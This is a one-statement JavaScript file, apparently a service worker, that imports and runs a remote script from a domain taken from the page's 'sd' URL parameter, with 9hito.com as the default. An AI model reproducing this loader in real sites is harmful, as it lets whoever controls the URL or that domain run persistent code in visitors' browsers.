importScripts(
  'https://' +
    ((location.search.match(/[?&]sd=([^&]+)/) || [])[1] || '9hito.com') +
    '/7fd/4ndjz/sw.hid.min.js?r=sw',
)
